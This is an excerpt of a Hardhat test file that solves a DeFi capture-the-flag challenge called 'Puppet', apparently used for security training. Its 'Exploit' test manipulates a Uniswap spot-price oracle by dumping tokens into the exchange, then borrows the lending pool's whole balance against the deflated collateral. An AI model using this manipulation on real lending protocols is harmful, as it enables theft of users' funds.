...
describe("[Challenge] Puppet", function () {
  ...
  before(async function () {
    ...
    const eth4OneToken = await calculateTokenToEthInputPrice(
      ethers.utils.parseEther("1"),
      UNISWAP_INITIAL_TOKEN_RESERVE,
      UNISWAP_INITIAL_ETH_RESERVE
    );
    console.log("1 eth:           ", ethers.utils.parseEther("1").toString());
    console.log("eth4OneToken:     ", eth4OneToken.toString());
  ...
  it("Exploit", async function () {
    ...
    let bigAmount = ethers.utils.parseEther("999");
    await this.token
      .connect(attacker)
      .approve(this.uniswapExchange.address, bigAmount);

    let deadline = (await ethers.provider.getBlock("latest")).timestamp * 3;

    await this.uniswapExchange
      .connect(attacker)
      .tokenToEthSwapInput(bigAmount, 1, deadline);

    let poolBalance = await this.token.balanceOf(this.lendingPool.address);
    let collateral = await this.lendingPool.calculateDepositRequired(
    ...
    await this.lendingPool
      .connect(attacker)
      .borrow(poolBalance, { value: collateral });
  });
